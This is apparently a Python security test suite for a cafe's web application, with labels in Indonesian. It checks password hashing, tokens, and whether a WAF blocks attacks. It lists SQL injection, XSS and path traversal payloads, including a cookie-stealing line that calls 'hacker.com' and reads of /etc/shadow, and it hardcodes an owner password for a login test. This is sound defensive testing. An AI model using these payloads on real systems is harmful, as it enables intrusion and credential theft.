# -*- coding: utf-8 -*-
"""
==============================================================================
SOHIB CAFFE & RESTO — AUTOMATED PENETRATION & SECURITY TESTING SUITE
File: security_test.py
Owner: Muh Ikhsan Anggara
Tujuan: Menguji dan membuktikan kehandalan WAF, Autentikasi, Cryptography,
        dan Anti-DDoS rate limiting server secara otomatis.
==============================================================================
"""

import urllib.request
import urllib.parse
import urllib.error
import json
import time
import sys

# Ensure UTF-8 output on Windows consoles
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')
if hasattr(sys.stderr, 'reconfigure'):
    sys.stderr.reconfigure(encoding='utf-8')
from security_utils import (
    hash_password,
    verify_password,
    generate_session_token,
    verify_session_token,
    generate_csrf_token,
    verify_csrf_token,
    inspect_request_payload
)

BASE_URL = "http://localhost:8080"

# ANSI Colors
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

test_results = []

def record_test(name: str, passed: bool, detail: str = ""):
    test_results.append({"name": name, "passed": passed, "detail": detail})
    status = f"{GREEN}✅ PASS{RESET}" if passed else f"{RED}❌ FAIL{RESET}"
    print(f"  [{status}] {name} {f'({detail})' if detail else ''}")

def test_cryptography_engine():
    print(f"\n{CYAN}{BOLD}1. 🔐 Pengujian Kriptografi Kata Sandi (PBKDF2-HMAC-SHA256){RESET}")
    # Test 1.1 Password Hashing & Verification
    pwd = "SohibStrongPassword2026!#"
    hashed = hash_password(pwd)
    
    is_valid = verify_password(pwd, hashed)
    record_test("Verifikasi Kata Sandi Cocok (Timing-Safe)", is_valid)

    is_wrong = verify_password("WrongPassword123", hashed)
    record_test("Penolakan Kata Sandi Salah", not is_wrong)

    # Test 1.2 Session Token Tamper Proofing
    token = generate_session_token(user_id=1, role="owner", email="owner@sohibcaffe.com")
    is_token_valid, user_data = verify_session_token(token)
    record_test("Verifikasi Token HMAC Sah", is_token_valid and user_data.get("role") == "owner")

    # Tamper payload
    tampered_token = token[:-4] + "abcd"
    is_tampered_valid, _ = verify_session_token(tampered_token)
    record_test("Penolakan Token Dimanipulasi / Dipalsukan", not is_tampered_valid)

    # Test 1.3 CSRF Token Verification
    csrf = generate_csrf_token("session_123")
    record_test("Verifikasi Token CSRF Sah", verify_csrf_token(csrf))
    record_test("Penolakan Token CSRF Palsu", not verify_csrf_token("invalid_csrf_token_payload"))

def test_waf_core_patterns():
    print(f"\n{CYAN}{BOLD}2. 🛡️ Pengujian Engine WAF (Deteksi Regex Payload Jahat){RESET}")

    # SQL Injection tests
    sqli_payloads = [
        "1' OR '1'='1",
        "admin' UNION SELECT null, username, password FROM users--",
        "1; DROP TABLE products;",
        "' OR 1=1 --",
        "1' AND SLEEP(5)--"
    ]
    for p in sqli_payloads:
        is_mal, reason = inspect_request_payload(p)
        record_test(f"Deteksi SQLi Payload: {p[:30]}...", is_mal, reason[:35] if is_mal else "Bocor!")

    # XSS tests
    xss_payloads = [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "<svg onload=fetch('http://hacker.com/?c='+document.cookie)>",
        "javascript:alert(1)",
        "<iframe src='http://evil.com'></iframe>"
    ]
    for p in xss_payloads:
        is_mal, reason = inspect_request_payload(p)
        record_test(f"Deteksi XSS Payload: {p[:30]}...", is_mal, reason[:35] if is_mal else "Bocor!")

    # Path Traversal & RCE tests
    traversal_payloads = [
        "../../../../etc/passwd",
        "..\\..\\windows\\system32\\cmd.exe",
        "../../.env",
        "; whoami",
        "system('cat /etc/shadow')"
    ]
    for p in traversal_payloads:
        is_mal, reason = inspect_request_payload(p)
        record_test(f"Deteksi Path Traversal / RCE: {p[:30]}...", is_mal, reason[:35] if is_mal else "Bocor!")

def test_live_server_endpoints():
    print(f"\n{CYAN}{BOLD}3. 🌐 Pengujian HTTP Live Server & WAF Defense{RESET}")
    try:
        # 3.1 Cek server status
        req = urllib.request.Request(f"{BASE_URL}/api/security/stats")
        with urllib.request.urlopen(req, timeout=3) as res:
            data = json.loads(res.read().decode('utf-8'))
            record_test("Akses Endpoint Status Keamanan /api/security/stats", data.get("server_status") == "ONLINE & SECURED")

        # 3.2 Cek Security Headers
        with urllib.request.urlopen(f"{BASE_URL}/index.html", timeout=3) as res:
            headers = res.headers
            has_csp = "Content-Security-Policy" in headers
            has_xfo = headers.get("X-Frame-Options") == "SAMEORIGIN"
            has_nosniff = headers.get("X-Content-Type-Options") == "nosniff"
            record_test("Security Header: Content-Security-Policy", has_csp)
            record_test("Security Header: X-Frame-Options: SAMEORIGIN", has_xfo)
            record_test("Security Header: X-Content-Type-Options: nosniff", has_nosniff)

        # 3.3 Uji WAF Menolak Serangan SQLi via GET URL
        malicious_url = f"{BASE_URL}/index.html?id=1'%20UNION%20SELECT%20*%20FROM%20users--"
        try:
            urllib.request.urlopen(malicious_url, timeout=3)
            record_test("WAF Memblokir Serangan SQLi via GET", False, "Server tidak memblokir!")
        except urllib.error.HTTPError as e:
            record_test("WAF Memblokir Serangan SQLi via GET", e.code == 403, f"HTTP {e.code} Forbidden")

        # 3.4 Uji WAF Menolak Serangan XSS via GET URL
        xss_url = f"{BASE_URL}/login.html?search=%3Cscript%3Ealert('hack')%3C/script%3E"
        try:
            urllib.request.urlopen(xss_url, timeout=3)
            record_test("WAF Memblokir Serangan XSS via GET", False, "Server tidak memblokir!")
        except urllib.error.HTTPError as e:
            record_test("WAF Memblokir Serangan XSS via GET", e.code == 403, f"HTTP {e.code} Forbidden")

        # 3.5 Uji WAF Menolak Scanner Jahat (sqlmap User-Agent)
        scanner_req = urllib.request.Request(f"{BASE_URL}/index.html", headers={"User-Agent": "sqlmap/1.5.2#stable"})
        try:
            urllib.request.urlopen(scanner_req, timeout=3)
            record_test("WAF Memblokir User-Agent Scanner (sqlmap)", False, "Scanner diizinkan masuk!")
        except urllib.error.HTTPError as e:
            record_test("WAF Memblokir User-Agent Scanner (sqlmap)", e.code == 403, f"HTTP {e.code} Forbidden")

        # 3.6 Uji Login Endpoint yang Aman
        login_payload = json.dumps({"username": "owner", "password": "sohib2024"}).encode('utf-8')
        login_req = urllib.request.Request(f"{BASE_URL}/api/auth/login", data=login_payload, headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(login_req, timeout=3) as res:
            login_res = json.loads(res.read().decode('utf-8'))
            record_test("Autentikasi Server PBKDF2 (/api/auth/login)", login_res.get("status") == "success" and "token" in login_res)

        # 3.7 Uji Login Password Salah
        bad_login_payload = json.dumps({"username": "owner", "password": "wrong_password"}).encode('utf-8')
        bad_login_req = urllib.request.Request(f"{BASE_URL}/api/auth/login", data=bad_login_payload, headers={"Content-Type": "application/json"})
        try:
            urllib.request.urlopen(bad_login_req, timeout=3)
            record_test("Penolakan Autentikasi Password Salah", False)
        except urllib.error.HTTPError as e:
            record_test("Penolakan Autentikasi Password Salah", e.code == 401, f"HTTP {e.code} Unauthorized")

    except urllib.error.URLError:
        print(f"\n{YELLOW}⚠️  Server 'security_server.py' belum aktif di {BASE_URL}. Lewati uji live server.{RESET}")
        print(f"   Jalankan: {CYAN}python security_server.py{RESET} lalu jalankan kembali script ini.")

def print_summary():
    total = len(test_results)
    passed = sum(1 for t in test_results if t["passed"])
    failed = total - passed

    print("\n" + "="*75)
    print(f" {BOLD}LAPORAN HASIL PENETRATION & SECURITY TESTING — SOHIB CAFFE{RESET}")
    print("="*75)
    print(f" Total Pengujian     : {total}")
    print(f" {GREEN}Passed (Lolos)       : {passed}{RESET}")
    print(f" {RED if failed > 0 else GREEN}Failed (Gagal)       : {failed}{RESET}")
    
    score = (passed / total * 100) if total > 0 else 0
    print(f" Skor Keamanan Total : {BOLD}{score:.1f}% ({'TINGKAT TINGGI / GRADE A+' if score >= 90 else 'PERLU PERBAIKAN'}){RESET}")
    print("="*75 + "\n")

if __name__ == "__main__":
    print(f"{CYAN}{BOLD}🛡️  MEMULAI SUITE PENGUJIAN KEAMANAN & PENETRASI SOHIB CAFFE & RESTO...{RESET}")
    test_cryptography_engine()
    test_waf_core_patterns()
    test_live_server_endpoints()
    print_summary()
